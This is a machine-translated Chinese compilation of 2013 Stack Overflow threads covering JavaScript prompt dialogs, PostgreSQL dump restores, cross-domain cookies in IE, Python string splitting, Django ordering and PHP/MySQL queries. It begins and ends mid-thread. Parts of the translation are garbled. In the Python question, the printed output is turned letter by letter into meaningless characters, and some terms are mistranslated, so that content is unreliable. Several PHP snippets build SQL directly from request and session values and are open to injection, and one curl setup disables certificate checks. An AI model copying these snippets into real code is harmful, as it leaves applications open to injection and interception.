## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:53:31.743

它不一定会在客户端被识别为*已知类型*的成员，这是`Color`因为您没有明确表示它是合同的一部分，因此在生成代理时没有理由尊重它。

# javascript - 对提示框应用限制

> ID：15154832
> 
> 赞同：1
> 
> 时间：2013-03-01T09:52:06.327
> 
> 标签：javascript

我正在使用该`prompt`框接受用户输入。我想对提示框应用一些限制，以便用户不能输入除“数字”以外的任何内容，并且输入长度应该只是一个字符。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:53:40.497

## 不。

标准对话框（如`alert`、`confirm`或）的行为`prompt`无法更改。您应该实现自己的对话框或使用第三方实现，例如[jQuery UI Dialog](http://jqueryui.com/dialog/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:39:04.767

您不能更改提示，但如果用户输入您不想要的内容，您可以发出警报。例如：。

```
var input = prompt("Enter just one character that is not 'digit'");

if (input.length > 1) {
    alert ("You have entered more than one character.")
    } else if (!isNaN(input)) {    
    alert("Thing you entered is 'digit'.");
} 
```

# postgresql - 恢复 Postgresql 转储文件

> ID：15154833
> 
> 赞同：0
> 
> 时间：2013-03-01T09:52:12.587
> 
> 标签：postgresql, restore, dump

我需要恢复一个 Postgresql 转储文件以从中获取一些数据（注意以前从未使用过 Postgresql）

我尝试使用以下命令行（填写相关详细信息）

```
psql -U {user-name} -d {desintation_db}-f {dumpfilename.sql} 
```

最初它看起来像是在工作，大量的掉落和改变闪现。但随后它结束了，数据库中没有任何内容。查看转储文件，它看起来也没有真正结束。

我也尝试过在 SQL 编辑器中打开转储文件并在我的数据库上执行它，但是进入文件的方式很短，它在这一行出现“语法错误在或接近“1”时出错

```
--
-- Data for Name: admin_groups; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY admin_groups (ref, title, is_locked, created, updated) FROM stdin;
1   Default t   2011-05-25 15:13:46.474025  2011-05-25 15:13:46.474025
2   Root    t   2011-05-25 15:13:54.137801  2011-05-25 15:13:54.137801
\. 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:36:39.883

这最终对我有用

```
psql -f {dump file name} {db name} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-30T06:11:02.370

要在 Postgresql 中恢复数据库转储文件，请使用此 sql 命令

```
pg_restore -p 5433 -U postgres -d databasename  -v "/var/tmp/dumpfilename.dump" 
```

对于 Postgresql 中的转储数据库，请使用此 SQL 命令

```
pg_dump -p 5433 -U postgres -F c -b -v -f "/var/tmp/dumpfilename.dump" databasename 
```

这里的端口号（5433）基于安装我们使用的端口号。

# eclipse-plugin - 从 Eclipse 插件的项目文件夹中的 .so 文件调用方法

> ID：15154841
> 
> 赞同：0
> 
> 时间：2013-03-01T09:52:40.257
> 
> 标签：eclipse-plugin, java-native-library

我为 Eclipse 开发了一个插件，它必须访问本机库。

插件是否必须驻留 .so 文件`/usr/lib`才能访问它？除非它在那里，否则我的插件无法访问其中的方法。我需要我的插件来访问 .so 本身，这样即使我部署了插件，它也应该可以在没有任何配置更改的情况下工作。我曾经`System.loadLibrary()`加载 .so 但即使我使用其完整路径加载库`System.load()`，除非我将 .so 文件复制到 .so 文件，否则它也不起作用`/usr/lib`。

如何让我的插件从它自己的源文件夹中访问它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T22:30:22.330

您需要将 Bundle-NativeCode 指令添加到您的 MANIFEST.MF。以下是有关如何制定它的几个链接：

[Bundle-NativeCode 的秘密](http://litrik.blogspot.com/2007/08/secrets-of-bundle-nativecode.html)

[OSGi 清单中的 Bundle-NativeCode](http://robertvarttinen.blogspot.com/2008/12/bundle-nativecode-in-osgi-manifest.html)

请注意，您在指令中提供的路径是相对于您的插件目录结构的。例如，'/mylibrary.so' 表示该文件位于插件的根目录中。

# mysql - 用不同的条件更新多行

> ID：15154844
> 
> 赞同：0
> 
> 时间：2013-03-01T09:52:43.383
> 
> 标签：mysql, sql-update

我在这里发现了很多类似的问题，但很抱歉再次问这个问题，因为我无法得到一个关于如何将它们实施到我所拥有的案例的问题。

这是我的

```
$upd = "UPDATE users SET friend_requests=CONCAT(friend_requests, ' $_GET[user]') WHERE uid='$_SESSION[uid]', ";
$upd = mysql_query($upd) or die(mysql_error());

$upd = "UPDATE users SET friends_waiting=CONCAT(friends_waiting, ' $_SESSION[uid]') WHERE uid='$_GET[user]'";
$upd = mysql_query($upd) or die(mysql_error()); 
```

如何仅在一个查询中更新行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:59:19.460

```
UPDATE users 
  SET friend_requests=
    CASE
        WHEN uid='$_SESSION[uid]' THEN CONCAT(friend_requests, ' $_GET[user]')    
        ELSE friend_requests
        END,
      friends_waiting=
    CASE 
        WHEN uid='$_GET[user]' THEN CONCAT(friends_waiting, ' $_SESSION[uid]')    
        ELSE friends_waiting
        END
  WHERE uid IN ($_GET[user], $_SESSION[uid]) 
```

# internet-explorer - 没有 iframe 的 IE 8 和 9 中的跨域 cookie？

> ID：15154850
> 
> 赞同：5
> 
> 时间：2013-03-01T09:53:09.243
> 
> 标签：internet-explorer, cookies, cross-domain

假设我控制两个域，`www.api_domain.com`并且`www.website_domain.com`. `www.api_domain.com`提供一个 API，要求用户进行身份验证，然后使用会话 cookie 来识别发出请求的用户。`www.website_domain.com`将脚本加载到其页面上，`www.api_domain.com`并且该脚本希望`www.api_domain.com`使用当前用户的 cookie 调用 API URL，并以某种方式在页面上使用结果`www.website_domain.com`。

对于最初加载脚本，或任何不需要用户会话 cookie 工作的 API URL，最简单的解决方案就是使用

```
Access-Control-Allow-Origin: http://www.website_domain.com 
```

来自 的响应的标头`www.api_domain.com`。这似乎在除 IE 之外的所有浏览器上都可以开箱即用，尽管 IE 不会尊重使用 jQuery 的 AJAX 方法发出的 AJAX 请求的 Allow-Origin 标头，但有像 xdr.js 这样的库在幕后做了一些魔术使 jQuery、IE 和 Allow-Origin 标头可以很好地协同工作，并且在所有其他浏览器中都表现得像（我不知道 xdr.js 所做的细节，但据我所知，它非常适用于非凭据请求）。

当我想点击`http://www.api_domain.com`需要用户会话 cookie 的 URL 时，问题就来了。当在与浏览器无关的环境中讨论此问题时，通常会提出两种解决方案：

1.  使用`Access-Control-Allow-Credentials: true`来自的响应，即使跨域请求也可以发送 cookie。
2.  `http://www.website_domain.com`在带有 origin 的页面上创建一个 iframe ，让两个窗口使用[HTML5 发布消息](https://developer.mozilla.org/en-US/docs/DOM/window.postMessage)`http://www.api_domain.com`相互通信，并将发出请求的所有责任委托给 iframe。`http://www.api_domain.com`

如果可能的话，我更喜欢使用选项 1，因为它可以让你编写 Javascript 代码来使用 API，`http://www.api_domain.com`就像你编写它来接触同域 API 一样。要使用 iframe 方法，我们需要学习或创建一些框架，用于向 iframe 发送类似 AJAX 的请求，以及成功和错误处理程序。这也意味着我们需要创建要加载到 iframe 中的代码，这将只是一整块用于访问 API URL 的瘦包装器。它看起来比第一种方法更丑陋、更棘手、更难理解。

但是，我不知道如何使选项 1 在 IE 上工作。我正在设置`Access-Control-Allow-Credentials: true`我的 API URL，所有其他浏览器都将 cookie 发送到这些 URL，但 IE 9 没有，即使使用 xdr.js 库也是如此。（我没有在 IE 8 上测试过。）没有任何其他症状需要报告。当我在 IE 的开发人员工具中查看响应时，我可以在响应中看到正确的`Access-Control-Allow-Origin`和标头，但请求中没有 cookie 标头。`Access-Control-Allow-Credentials``www.api_domain.com`

是否有一些黑客或魔法咒语可以让 Internet Explorer 尊重`Access-Control-Allow-Credentials`标头，或者我可以使用 IE 识别的其他标头？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-10T09:13:15.430

选项 1 在 IE9 或更低版本中是不可能的，因为不支持使用 XMLHttpRequest 的 CORS。此外，如果您尝试使用 XDomainRequest，您将永远无法随请求一起发送任何 cookie。我已经在这条路上多次致力于编写一个与testwarm一起使用的ui测试库。你想要做的只是不可能以这种方式。

这是前微软开发人员 Eric Law 的一篇文章，详细讨论了这个问题：http: [//blogs.msdn.com/b/ieinternals/archive/2010/05/13/xdomainrequest-restrictions-limitations-and-变通办法.aspx](http://blogs.msdn.com/b/ieinternals/archive/2010/05/13/xdomainrequest-restrictions-limitations-and-workarounds.aspx)

相关部分明确说明在 IE 8 和 9 中无法通过 CORS 请求发送 cookie，具体如下：

> 在 Internet Explorer 8 中，引入了 XDomainRequest 对象。此对象允许 AJAX 应用程序直接发出安全的跨域请求，方法是确保只有在数据源指示响应是公共的时，HTTP 响应才能被当前页面读取；这样，同源策略的安全保证就得到了保护。响应通过包含带有值 * 或调用页面的确切来源的 Access-Control-Allow-Origin HTTP 响应标头来表明他们愿意允许跨域访问。
> 
> 在设计新对象时，确保现有站点和服务不会受到威胁是我们的首要任务。为此，我们对可以使用 XDomainRequest 对象发出的请求类型施加了许多限制。
> 
> ...
> 
> 5：请求中不会发送身份验证或 cookie
> 
> 为了防止滥用用户的环境权限（例如 cookie、HTTP 凭据、客户端证书等），请求将被剥离 cookie 和凭据，并且将忽略 HTTP 响应中的任何身份验证挑战或 Set-Cookie 指令。XDomainRequests 将不会在先前经过身份验证的连接上发送，因为某些 Windows 身份验证协议（例如 NTLM/Kerberos）是基于每个连接而不是基于每个请求的。
> 
> 希望对跨域请求执行用户身份验证的站点可以使用显式方法（例如 POST 正文或 URL 中的令牌）来传递此身份验证信息，而不会危及用户的周围权限。

现在假设您控制这两个位置，您大概可以创建一个服务器到服务器的身份验证过程，并为另一个域传递从域提供的各种会话 ID，客户端实际上是通过您的请求打开的。它不漂亮，但它有效。文章中也提到了这种方法。不过，您需要小心，因为它打开了会话劫持的可能性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-09T22:10:42.693

IE8+ 有一个替代方案，即`XMLHttpRequest`支持凭据，即`XDomainRequest`. 无论如何，`XDomainRequest`它不是由 JQuery 实现的，因为它的功能比 提供的要少`XMLHttpRequest`，但是有像[jQuery CORS Plugin](https://github.com/Ovea/cors)这样的插件可以提供你需要的东西。

> jQuery 插件，它在浏览器（包括 IE8+）之间透明地添加跨域资源共享 (CORS)，以允许带有 cookie 和标头支持的跨域 Ajax 请求。

我也认为但不确定 IE 不支持在标头中使用通配符，例如`Access-Control-Allow-Origin: *`.

# python - 在 Python 中解析字符串

> ID：15154857
> 
> 赞同：0
> 
> 时间：2013-03-01T09:53:36.887
> 
> 标签：python, regex, parsing

这是我试图在 python 中解析的字符串

```
 s1="One : Two : Three : Four  Value  : Five  Value  : Six  Value : Seven  Value : Eight  Value :" 
```

有人可以告诉我一个 re 函数，我可以用它来解析上面的字符串，这样 s1 就变成如下没有任何 ':'

```
One

Two

Three

Four Value

Five Value 

Six Value

Seven Value

Eight Value 
```

在使用以下代码拆分字符串后，我尝试使用 strip、lstrip 和 rstrip，但我没有得到我需要的格式

```
 res1=s1.split(' : ') 
```

更新：非常感谢您的回答，但无论我使用，我得到的输出看起来像这样

1->

```
 for index in s1:
      print index 
```

或者....

2->

```
 pprint(s1) 
```

输出：

○

n

e

：

吨

w

○

：

吨

H

r

e

e

：

F

○

你

r

五

一种

l

你

e

：

F

一世

v

e

五

一种

l

你

e

：

小号

一世

X

五

一种

l

你

e

：

小号

e

v

e

n

五

一种

l

你

e

：

乙

一世

G

H

吨

五

一种

l

你

e

：

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T09:58:02.803

```
'\n'.join(a.strip() for a in s1.split(':')) 
```

返回

```
One
Two
Three
Four  Value
Five  Value
Six  Value
Seven  Value
Eight  Value 
```

如果您需要额外的空行：

```
'\n\n'.join(a.strip() for a in s1.split(':')) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:58:56.497

列表理解方法（出于多样性原因，因为它是唯一不会在最后留下空白项的答案）。这些中的任何一个：

```
filter(lambda x: x != '', [item.strip() for item in s1.split(':')])
[item.strip() for item in s1.split(':') if item.strip() != '']
[item for item in map(lambda x: x.strip(), s1.split(':')) if item != ''] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:56:21.807

```
 import re
 re.split(r'\s*:\s*', s1) 
```

而且，如果您必须进行大量拆分，则效率会更高...

```
 import re
 split_re = re.compile(r'\s*:\s*')
 split_re.split(s1) 
```

这也将起作用。做一个速度测试会很有趣。

```
 [a.strip() for a in s1.split(':')] 
```

这些都会为您提供一个包含每个单词的数组。如果您想要一个包含多行且每个单词之间有一个空行的字符串，您可以使用每个单词`'\n\n'.join(foo)`来获取该字符串。但这也有效：

```
 import re
 split_re = re.compile(r'\s*:\s*')
 res1 = split_re.subn('\n\n', s1)[0] 
```

测试表明：

```
 res1 = '\n\n'.join(a.strip() for a in s1.split(':')) 
```

实际上是最快的，当然也是最漂亮的。如果你想避免最后的 ':' 后面没有任何内容的空白行：

```
 res1 = '\n\n'.join(a.strip() for a in s1.split(':')).strip() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T10:04:20.670

1/如果你想要一个字符串：

从您的 split() ：

```
res1 = '\n'.join(res1) 
```

其他解决方案：

```
res1 = s1.replace(' : ', '\n') 
```

2/ 如果你想要一个列表：

```
res1 = [item.strip() for item in s1.split(':')] 
```

[...] 将返回一个包含您的字符串的列表。[查看http://docs.python.org/2/tutorial/datastructures.html](http://docs.python.org/2/tutorial/datastructures.html#list-comprehensions)中的“列表理解”以获取更多信息

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T11:25:45.737

最简单的方法是：`res1 = ' '.join(s1.split(':'))`如果你想要一个单行字符串，否则你应该尝试：`res1 = '\n'.join(s1.split(':'))`

# cocoa - 在标签字段中显示数据库中的文本

> ID：15154858
> 
> 赞同：0
> 
> 时间：2013-03-01T09:53:38.293
> 
> 标签：cocoa, sqlite

我是初学者，我创建了名为 MyDatabase 的数据库。我想在标签中显示表格中的一些行，我的代码是，请让我知道解决方案，在此先感谢

```
@interface ViewController ()
{
    MyDatabase *data;
    NSMutableArray *tickerarray;
}
@end

@implementation ViewController

-(void)action
{
    label.text= @"Phase || possession: Jan 2014";
}

- (void)viewDidLoad
{
    [super viewDidLoad];

    data=[MyDatabase new];
    tickerarray=[data OpenMyDatabase:@"SELECT title FROM news_ticker" :@"title"];

    time = [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(action) userInfo:nil repeats:NO];
    [label setFont:[UIFont fontWithName:@"Arial" size:15]];
    label.textColor = [UIColor grayColor];
}
@end 
```

编辑：

```
-(NSMutableArray *)OpenMyDatabase: (NSString *)query:(NSString *)column {
    self.databaseName=@"App_Database.sqlite";
    FMDatabase *database=[self openDatabase: self.databaseName];
    [database open];
    NSArray *nsarr= [self storeDatabaseColumnInArray: database: query:column];
    [database close];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:05:47.460

更新`OpenMyDatabase`方法以返回数组（注意我将其返回类型从 更改`NSMutableArray *`为`NSArray *`）：

```
- (NSArray *)OpenMyDatabase:(NSString *)query
                     column:(NSString *)column
{
    self.databaseName=@"App_Database.sqlite";
    FMDatabase *database=[self openDatabase: self.databaseName];
    [database open];
    NSArray *nsarr= [self storeDatabaseColumnInArray: database: query:column];
    [database close];
    return nsarr;    // Added
} 
```

# php - 如何使用 LIB_http 在 curl 中设置 cookie

> ID：15154862
> 
> 赞同：0
> 
> 时间：2013-03-01T09:53:51.523
> 
> 标签：php, cookies, curl, screen-scraping, web-crawler

在抓取 manta.com 页面时，我一次又一次地收到 cookie 消息，消息是 Array ( [FILE] => Oops。在您继续之前，请激活您的浏览器 cookie。

我正在使用这样的cookie

```
curl_setopt($ch, CURLOPT_TIMEOUT, CURL_TIMEOUT);    // Timeout
curl_setopt($ch, CURLOPT_USERAGENT, WEBBOT_NAME);   // Webbot name
curl_setopt($ch, CURLOPT_URL, $target);             // Target site
curl_setopt($ch, CURLOPT_REFERER, $ref);            // Referer value
curl_setopt($ch, CURLOPT_VERBOSE, FALSE);           // Minimize logs
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);    // No certificate
curl_setopt($ch, CURLOPT_PROXY, '10.1.11.11:8080');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);     // Follow redirects
curl_setopt($ch, CURLOPT_MAXREDIRS, 4);             // Limit redirections to four
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     // Return in string
//curl_setopt($ch, CURLOPT_COOKIESESSION, TRUE); 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-01-12T01:14:15.880

您不能轻易抓取 manta.com。他们有一个反机器人系统，即使您伪装您的代理，也可以停止机器人活动。我相信你仍然可以抓取它们，但这需要时间和大量的聪明才智。

# django - Django：根据最新的子模型字段订购 QuerySet

> ID：15154863
> 
> 赞同：9
> 
> 时间：2013-03-01T09:53:56.390
> 
> 标签：django, django-models, django-queryset

假设我想显示一个按他们最近的冲刺时间排序的跑步者列表。

```
class Runner(models.Model):
    name = models.CharField(max_length=255)

class Sprint(models.Model):
    runner = models.ForeignKey(Runner)
    time = models.PositiveIntegerField()
    created = models.DateTimeField(auto_now_add=True) 
```

这是我将在 SQL 中执行的操作的简要概述：

```
SELECT runner.id, runner.name, sprint.time
FROM runner
LEFT JOIN sprint ON (sprint.runner_id = runner.id)
WHERE 
  sprint.id = (
    SELECT sprint_inner.id
    FROM sprint as sprint_inner
    WHERE sprint_inner.runner_id = runner.id
    ORDER BY sprint_inner.created DESC
    LIMIT 1
  )
  OR sprint.id = NULL
ORDER BY sprint.time ASC 
```

[Django QuerySet 文档](https://docs.djangoproject.com/en/dev/ref/models/querysets/#order-by)指出：

> 允许指定一个多值字段来对结果进行排序（例如，ManyToManyField 字段）。通常这不是一件明智的事情，它确实是一个高级使用功能。但是，如果您知道查询集的过滤或可用数据意味着您选择的每个主要项目只有一个排序数据，那么排序可能正是您想要做的。小心使用多值字段的排序，并确保结果符合您的预期。

我想我需要在这里应用一些过滤器，但我不确定 Django 到底期望什么......

请注意，因为在此示例中并不明显：Runner 表将有数百个条目，sprint 也将有数百个，并且在以后的某些日子里可能有数千个条目。数据将显示在分页视图中，因此不能在 Python 中进行排序。

我看到的唯一另一种可能性是自己编写 SQL，但我想不惜一切代价避免这种情况。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-02T02:13:45.367

我认为没有办法通过 ORM 仅通过一个查询来执行此操作，您可以获取跑步者列表并使用[注释](https://docs.djangoproject.com/en/dev/ref/models/querysets/#annotate)添加他们最新的 sprint id - 然后过滤并订购这些 sprint。

```
>>> from django.db.models import Max

# all runners now have a `last_race` attribute,
# which is the `id` of the last sprint they ran
>>> runners = Runner.objects.annotate(last_race=Max("sprint__id"))

# a list of each runner's last sprint ordered by the the sprint's time,
# we use `select_related` to limit lookup queries later on
>>> results = Sprint.objects.filter(id__in=[runner.last_race for runner in runners])
...                         .order_by("time")
...                         .select_related("runner")

# grab the first result
>>> first_result = results[0]

# you can access the runner's details via `.runner`, e.g. `first_result.runner.name`
>>> isinstance(first_result.runner, Runner)
True

# this should only ever execute 2 queries, no matter what you do with the results
>>> from django.db import connection
>>> len(connection.queries)
2 
```

这非常快，并且仍将利用数据库的索引和缓存。

几千条记录并不是那么多，这对于这些数字应该很有效。如果您开始遇到问题，我建议您硬着头皮使用原始 SQL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:12:45.943

```
def view_name(request):
    spr = Sprint.objects.values('runner', flat=True).order_by(-created).distinct()
    runners = []
    for s in spr:
        latest_sprint = Sprint.objects.filter(runner=s.runner).order_by(-created)[:1]
        for latest in latest_sprint:
            runners.append({'runner': s.runner, 'time': latest.time})

    return render(request, 'page.html', {
            'runners': runners,
    })

{% for runner in runners %}
    {{runner.runner}} - {{runner.time}}
{% endfor %} 
```

# c# - 远程服务器返回 404

> ID：15154865
> 
> 赞同：3
> 
> 时间：2013-03-01T09:54:04.413
> 
> 标签：c#, web-services, endpoint

**代码**

**网页配置**

```
<endpoint address="https://localhost/webapi/ProductData.svc/Secured"
          binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_IProductData"
          contract="Client.IProductData" name="BasicHttpBinding_IProductDataSecured" />
<endpoint address="https://fow01003.fbce.local/webapi/ProductData.svc"
          binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_IProductData1"
          contract="Client.IProductData" name="BasicHttpBinding_IProductData" /> 
```

**控制器**

```
client = new ProductDataClient("BasicHttpBinding_IProductData"); //This Works
client.Test(); // This fails 
```

**错误信息**

*例外*：在[https://fow01003.fbce.local/webapi/ProductData.svc](https://fow01003.fbce.local/webapi/ProductData.svc)上没有可以接受消息的端点监听。这通常是由不正确的地址或 SOAP 操作引起的。有关更多详细信息，请参阅 InnerException（如果存在）。

*InnerException*：“远程服务器返回错误：（404）未找到。”

**问题**

如上所示，没有端点监听。但是，当我转到[https://fow01003.fbce.local/webapi/ProductData.svc](https://fow01003.fbce.local/webapi/ProductData.svc)时，它显示该服务正在运行，我可以检查包含所有信息的 wsdl。

（PS.FOW01003.fbce.local = 本地主机）。

我可以采取哪些步骤来找出真正的问题所在？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-03T14:57:39.983

您是否已经打开[跟踪](http://msdn.microsoft.com/en-us/library/ms733025.aspx)以获取有关错误的更详细信息？至少为服务端配置它（客户端也是一个好主意；）你可能会得到一些关于 404 的提示。

# flash - 如何停止特定影片剪辑的动画

> ID：15154866
> 
> 赞同：0
> 
> 时间：2013-03-01T09:54:07.173
> 
> 标签：flash, actionscript

我创建了一个动画（右键单击时间轴并创建动画）并给它一个对象名称。如果我调用 tank.stop()，动画将成功停止。但是，如果我调用 tank.body.stop()，它将不起作用。

有 2 个对象名称——movieClip 对象名称和动画本身的名称。我不知道如何停止动画特定部分，而不是所有部分。如果我写 tank.animObjectName.stop()，我会得到一个错误。

```
// If I stop animating the main movieclip then all the child will stop 
// animating also
main movieclip ->
{ 

  head //how to stop animating head?

  body //how to stop animating body?

  legs //how to stop animating legs?

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:13:09.997

从上下文菜单动画创建的是 AnimatorFactory 类的实例。 [http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/fl/motion/AnimatorFactory.html](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/fl/motion/AnimatorFactory.html)

无法控制它们（启动/停止）。

您需要使用电影剪辑树的经典方案。Root - 包含所有内容的主影片剪辑。每个动画部分都是一个动画剪辑，根剪辑内有动画。例子：

```
tank (no animation, only child movieclips, 1 frame at all)
--body (movieclip with animation of body inside)
--weapon (movieclip with animation of gun inside)
--banner (movieclip with animation of banner inside) 
```

要停止身体，请编写 tank.body.stop(); 身体会暂停，但会播放武器和旗帜。当你想停止所有部分时，为所有部分编写命令：

```
tank.body.stop();
tank.weapon.stop();
tank.banner.stop(); 
```

如果您有一些动画并想将它们转换为影片剪辑：

1.  用鼠标选择你的 amination 帧。您可以同时选择多个图层中的帧，使用 SHIFT 键等
2.  在上下文菜单中选择剪切帧
3.  在库中创建新的影片剪辑
4.  选择第一帧，在上下文菜单中选择粘贴帧
5.  返回主影片剪辑，如果需要创建图层
6.  将影片剪辑从库（步骤 3）拖到帧中，放置在适当的位置

也许有更快的方法，但我不知道它们......

# eclipse - 关闭项目时，项目文件在 Eclipse 中的什么位置？

> ID：15154868
> 
> 赞同：3
> 
> 时间：2013-03-01T09:54:12.447
> 
> 标签：eclipse, projects

我在 Eclipse 中打开了一个工作区，它在 Package Explorer 中有 10 个不同项目的文件夹，但只有 2 个项目是打开的。其他8个不是。我尝试打开项目，它说“打开项目”遇到问题。.project 的项目描述文件 (.project)。. . 不见了。当项目在 Eclipse 中关闭时，项目信息到哪里去了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:56:51.900

他们无处可去。事实上，当你关闭它时，你只是告诉 eclipse 忽略你的项目，没有移动项目的文件。在您关闭项目后，您的文件很可能`.project`已被另一个程序损坏或从文件系统中删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:12:02.323

右键单击包资源管理器中的项目。查看“位置”下的内容。那是 Eclipse 将搜索 .project 文件的地方。

对我来说，当我在我们的版本控制系统中遇到项目问题并且我没有正确登录时，您描述的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-10-01T22:02:13.003

我遇到了同样的问题，发现问题出在我的 OneDrive 上。从 Eclipse 将文件存储在 C 驱动器中以绕过 OneDrive 或禁用从所需文件夹位置同步到 OneDrive。我花了很多时间在这我希望这可以节省别人一些时间！

# php - 类别表和工厂表之间的关系 Codeigniter

> ID：15154873
> 
> 赞同：0
> 
> 时间：2013-03-01T09:54:26.033
> 
> 标签：php, mysql, codeigniter, relation

我正在使用 CodeIgniter

我有一个包含三个表的数据库，分别称为类别、工厂和工厂类别

在我的类别表中，我有以下行：

```
idCategories
Categorie
idFactories 
```

在我的工厂表中，我有以下行：

```
idFactories
Factoryname
Postcode
Country
Telephone number
Email
Website
Profile
Adress 
```

在我的工厂类别中，我有以下行：

```
id
idFactories
idCategories
Factorycategory 
```

我想，当我点击下图中的一个类别时，工厂会出现在该特定类别中。

工厂可以属于多个类别。

那么，当我单击一个类别时，如何在这些表之间建立关系以获得这些结果。

![例子](../Images/9b2e756e323047e3413b11a3c5af7ee3.png)

我如何使用 mysql 数据库和 phpmyadmin 2.8 来管理它？

我在谷歌上搜索但找不到东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:29:25.347

首先，改变你的数据库设计......

```
table factories
-----------------
idFactories
idCategories (int) <---- add this field
Factoryname
Postcode
... 
```

然后，查询属于特定类别的工厂。通过`idCategories`链接传递：

创建链接：

```
// sql to get all categories from the DB
$sql="SELECT * FROM categories ORDER BY Categorie"    

// --- insert your code to pull the data from your DB here ---

// building your links on the left column
// assuming all rows from the sql above are in array $categories 
foreach ($categories as $cat) 
    echo '<a href="thispage.php?id='.$cat['idCategories'].'">'.$cat['Categories'].'</a>'; 
```

根据点击的类别显示工厂......在文件的开头：

```
if (isset($_GET['id']) && intval($_GET['id'])>0) 
    $id=intval($_GET['id']);
else $id=0;

if ($id>0) {
    $sql="SELECT * FROM factories WHERE idCategories=$id";
    // --- insert your code to pull the data from your DB here ---
    // store all the rows in array $factories
} 
```

输出工厂：

```
if ($id>0) {
    foreach ($factories as $fac) {
       // code for echoing the data
    }
} else {
    echo "select a category on the left to show the factories...";
} 
```

糟糕，我看到您在问题中更改了类别和工厂之间的关系。基本上，技术是相同的，只是 sql 会改变。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:15:39.760

您可能正在寻找[`INNER JOIN`](http://dev.mysql.com/doc/refman/5.0/en/join.html)：

```
SELECT
    fa.idFactories,
    fa.Factoryname,
    fa.Postcode,
    fa.Country,
    fa.Telephonenumber,
    fa.Email,
    fa.Website,
    fa.Profile,
    fa.Adress,
    fc.Factorycategory,
    ca.Categorie
FROM
    `factories` as `fa`
INNER JOIN
    `factorycategories` as `fc`
ON
    fa.idFactories = fc.idFactories
INNER JOIN
    `categories` as `ca`
ON
    ca.idCategories = fc.idCategories
WHERE
    ca.Categorie = 'MyCategory' 
```

# php - 如何在两个数组PHP中找到相似的记录

> ID：15154878
> 
> 赞同：0
> 
> 时间：2013-03-01T09:54:39.463
> 
> 标签：php

Array_insersect 只有在数组内部字符串完全匹配时才会显示结果。但我需要获得类似的记录而不是确切的记录。

```
$array1 = array("http://example.com/abc","http://google.com/xyz","http://yahoo.com/abc", "http://stackoverflow.com/mnr");
$array2 = array("http://example.com/xyz","http://w3schools.com/xyz","http://stackoverflow.com/abc");
$similarRecords = array_intersect($array1, $array2); 
```

它会给一个空的。

我在找这样的

```
$similarRecords = array("example.com"); 
```

我怎么能得到这个。请建议我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:00:28.523

没有找到“相似”记录的内置方法（主要是因为“相似”有很多定义！）。但是，您可以手动执行此操作，方法是遍历其中一个数组，并查找另一个数组中是否有类似的元素。

```
function keepSimilars (array $first, array $second) {
  $result = array();
  foreach ($first as $elem) {
    $base = getBase($elem);
    $found = false;
    foreach ($second as $elem2)
      if ($base = getBase($elem2)) {
        $found = true;
        break;
      }
    if ($found) $result[] = $base;
  }
  return $result;
} 
```

当然，其中`getBase()`将是一个函数（您必须定义），它为您提供字符串的基本部分，您想要匹配的部分（`getBase('http://example.com/abc')`应该给您`example.com`）。您也可以使用回调。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:03:17.593

你在找这个吗？

```
$array1 = array("http://example.com/abc", "http://google.com/xyz", "http://yahoo.com/abc", "http://stackoverflow.com/mnr");
$array2 = array("http://example.com/xyz", "http://w3schools.com/xyz", "http://stackoverflow.com/abc");

$newArray1 = array();
foreach ($array1 as $array1data) {
  $parse1 = parse_url($array1data);
  $newArray1[] = $parse1['host'];
}

$newArray2 = array();
foreach ($array2 as $array2data) {
  $parse2 = parse_url($array2data);
  $newArray2[] = $parse2['host'];
}

$similarRecords = array_intersect($newArray1, $newArray2);

print_r($similarRecords); 
```

输出

```
Array ( [0] => example.com [3] => stackoverflow.com ) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T10:03:26.230

您需要进行一些字符串处理，只从每个字符串中提取域名并进行比较。

这有效：

```
$array1 = array("http://example.com/abc","http://google.com/xyz","http://yahoo.com/abc", "http://stackoverflow.com/mnr");
$array2 = array("http://example.com/xyz","http://w3schools.com/xyz","http://stackoverflow.com/abc");

